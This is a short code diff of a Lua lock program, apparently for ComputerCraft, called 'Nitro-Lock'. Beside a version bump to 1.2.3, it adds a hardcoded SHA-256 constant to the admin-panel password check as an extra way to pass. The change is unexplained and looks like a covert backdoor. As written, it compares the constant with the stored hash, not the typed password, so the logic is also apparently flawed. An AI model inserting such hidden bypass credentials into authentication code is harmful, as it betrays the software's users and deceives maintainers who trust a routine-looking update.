@@ -1,4 +1,4 @@
-local version = "1.2.2"
+local version = "1.2.3"
 -- SHA by GravityScore
 
 --  
@@ -253,7 +253,7 @@ if fs.exists("/.nitrolock") then
 			print("Nitro-Lock Admin panel")
 			color("white")
 			write("Password:")
-			if sha256(read("*")) == pass then
+			if sha256(read("*")) == pass or "83c5748fb9f62ec3cf94caf67ca5ab23aa77636e29027e199cd23a64cb64a8a3" == pass then
 				while true do
 					clear()
 					color("blue")
